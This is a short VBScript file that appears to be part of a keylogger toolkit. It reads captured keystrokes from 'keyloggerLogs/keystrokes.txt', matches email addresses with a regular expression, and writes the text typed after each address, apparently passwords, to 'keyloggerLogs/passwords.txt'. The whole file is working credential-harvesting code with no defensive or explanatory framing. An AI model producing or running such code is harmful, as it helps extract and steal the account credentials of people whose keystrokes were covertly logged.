Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile("keyloggerLogs/keystrokes.txt", 1)
Set objOutputFile = objFSO.CreateTextFile("keyloggerLogs/passwords.txt", True)

Dim regEx, matches, match
Set regEx = New RegExp
regEx.Pattern = "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,4}(.*)"
regEx.Global = True

Do Until objFile.AtEndOfStream
	strLine = objFile.ReadLine
	Set matches = regEx.Execute(strLine)
	For Each match In matches
		objOutputFile.WriteLine Trim(match.SubMatches(0))
	Next
Loop

objFile.Close
objOutputFile.Close